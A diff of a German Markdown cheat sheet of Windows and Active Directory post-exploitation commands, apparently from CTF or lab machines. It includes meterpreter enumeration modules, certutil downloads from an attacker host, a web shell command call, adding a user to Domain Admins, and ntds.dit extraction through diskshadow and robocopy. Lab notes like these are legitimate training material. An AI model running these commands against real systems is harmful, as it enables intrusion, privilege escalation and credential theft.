@@ -15,7 +15,6 @@
 
 **System-Informationen:**
 
-meterpreter
 
 ```meterpreter
 getuid
@@ -24,7 +23,6 @@ sysinfo
 
 **User-Enumeration:**
 
-meterpreter
 
 ```meterpreter
 run post/windows/gather/enum_logged_on_users
@@ -32,7 +30,6 @@ run post/windows/gather/enum_logged_on_users
 
 **Anwendungen:**
 
-meterpreter
 
 ```meterpreter
 run post/windows/gather/enum_applications
@@ -40,7 +37,6 @@ run post/windows/gather/enum_applications
 
 **Netzwerk:**
 
-meterpreter
 
 ```meterpreter
 run post/windows/gather/enum_network
@@ -48,7 +44,6 @@ run post/windows/gather/enum_network
 
 **Shell-Zugriff:**
 
-meterpreter
 
 ```meterpreter
 shell
@@ -58,7 +53,6 @@ shell
 
 **Aktueller User:**
 
-cmd
 
 ```cmd
 whoami
@@ -67,7 +61,6 @@ whoami /priv
 
 **System-Informationen:**
 
-cmd
 
 ```cmd
 systeminfo
@@ -75,7 +68,6 @@ systeminfo
 
 **User-Auflistung:**
 
-cmd
 
 ```cmd
 net user
@@ -84,7 +76,6 @@ dir C:\Users
 
 **Netzwerk:**
 
-cmd
 
 ```cmd
 ipconfig
@@ -92,7 +83,6 @@ ipconfig
 
 **Dateien suchen:**
 
-cmd
 
 ```cmd
 dir
@@ -100,7 +90,6 @@ dir
 
 **Prozesse:**
 
-cmd
 
 ```cmd
 ps  # (in Evil-WinRM/PowerShell)
@@ -110,7 +99,6 @@ ps  # (in Evil-WinRM/PowerShell)
 
 **Verzeichniswechsel:**
 
-cmd
 
 ```cmd
 cd C:\Users\butler
@@ -121,7 +109,6 @@ cd /root
 
 **Datei-Download (Windows):**
 
-cmd
 
 ```cmd
 certutil.exe -urlcache -f http://<ATTACKER_IP>/winPEASx64.exe winPEASx64.exe
@@ -131,7 +118,6 @@ certutil -urlcache -split -f http://<ATTACKER_IP>/SetOpLock.exe SetOpLock.exe
 
 **Datei-Download (Evil-WinRM):**
 
-powershell
 
 ```powershell
 download ntds.dit
@@ -148,7 +134,6 @@ put shell.aspx
 
 **Datei-Kopieren:**
 
-cmd
 
 ```cmd
 cp /mnt/dev/save.zip ~/save.zip
@@ -158,7 +143,6 @@ copy Wise.exe BootTime.exe
 
 **Datei-Lesen:**
 
-cmd
 
 ```cmd
 cat todo.txt
@@ -179,7 +163,6 @@ unzip save.zip  # Password: java101
 
 **Datei-Suche:**
 
-powershell
 
 ```powershell
 # PowerShell Flag-Suche
@@ -188,7 +171,6 @@ Get-ChildItem -Path C:\ -Include "user.txt", "*flag*", "root.txt" -File -Recurse
 
 **Dateiberechtigungen:**
 
-cmd
 
 ```cmd
 # Ownership übernehmen
@@ -202,7 +184,6 @@ icacls "C:\Users\Administrator\Desktop\root.txt" /grant Administrator:F
 
 **Service Status prüfen:**
 
-cmd
 
 ```cmd
 sc query WiseBootAssistant
@@ -210,7 +191,6 @@ sc query WiseBootAssistant
 
 **Service stoppen:**
 
-cmd
 
 ```cmd
 sc stop WiseBootAssistant
@@ -218,7 +198,6 @@ sc stop WiseBootAssistant
 
 **Service starten:**
 
-cmd
 
 ```cmd
 sc start WiseBootAssistant
@@ -243,7 +222,6 @@ curl "http://<TARGET_IP>/dev/back.php?c=net%20localgroup%20Administrators%20harr
 
 **Zu Domain Admins hinzufügen:**
 
-cmd
 
 ```cmd
 net group "Domain Admins" harry /add /domain
@@ -269,7 +247,6 @@ changepasswd.py retro.vl/banking$:banking@<TARGET_IP> -altuser trainee -altpass 
 
 **PowerShell:**
 
-powershell
 
 ```powershell
 Get-ADTrust -Filter *
@@ -286,7 +263,6 @@ ldeep ldap -u harry -p 'haxxor@12345' -d lab.trusted.vl -s ldap://<TARGET_IP> tr
 
 **Shadow Copy erstellen:**
 
-powershell
 
 ```powershell
 "set context persistent nowriters" | Out-File extract.dsh -Encoding ASCII
@@ -298,7 +274,6 @@ diskshadow /s extract.dsh
 
 **Dateien kopieren:**
 
-cmd
 
 ```cmd
 robocopy z:\windows\ntds C:\Temp ntds.dit /B
@@ -529,7 +504,6 @@ profiles.xml                        # Remote Desktop Plus
 
 ### Certutil Syntax
 
-cmd
 
 ```cmd
 certutil -urlcache -f <URL> <OUTPUT>
@@ -538,7 +512,6 @@ certutil -urlcache -split -f <URL> <OUTPUT>
 
 ### Net Commands
 
-cmd
 
 ```cmd
 net user                                    # User auflisten
@@ -549,7 +522,6 @@ net group "Domain Admins" <USER> /add /domain
 
 ### Service Control
 
-cmd
 
 ```cmd
 sc query <SERVICE>
@@ -559,7 +531,6 @@ sc start <SERVICE>
 
 ### Robocopy Syntax
 
-cmd
 
 ```cmd
 robocopy <SOURCE> <DEST> <FILE> /B
@@ -567,7 +538,6 @@ robocopy <SOURCE> <DEST> <FILE> /B
 
 ### PowerShell File Search
 
-powershell
 
 ```powershell
 Get-ChildItem -Path <PATH> -Include <PATTERN> -File -Recurse -ErrorAction SilentlyContinue
